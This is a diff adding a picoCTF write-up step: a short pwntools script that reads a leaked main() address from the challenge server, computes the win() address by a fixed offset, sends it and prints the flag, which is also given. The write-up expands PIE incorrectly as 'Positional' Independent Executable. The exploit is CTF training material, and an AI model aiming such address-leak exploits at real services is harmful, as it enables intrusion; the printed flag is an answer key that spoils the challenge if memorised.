@@ -53,4 +53,25 @@ int main() {
   foo();
 }  
 ```
+PIE probably stands for Positional Independent Executable  
+
+```
+from pwn import *    
+hostname = "rescued-float.picoctf.net"
+port = 62929
+  
+# p = process("./vuln")  
+p = remote(hostname, port)
+p.recvuntil(b"main: ")  
+main_addr = int(p.recvline().strip(), 16)  
+win_addr = main_addr - 0x96  
+p.sendline(hex(win_addr))  
+p.recvuntil(b"You won!\n")  
+flag = p.recvline()  
+print(flag.strip().decode("utf-8"))  
+p.close()
+```
+
+#### picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_00dea386}
+
 
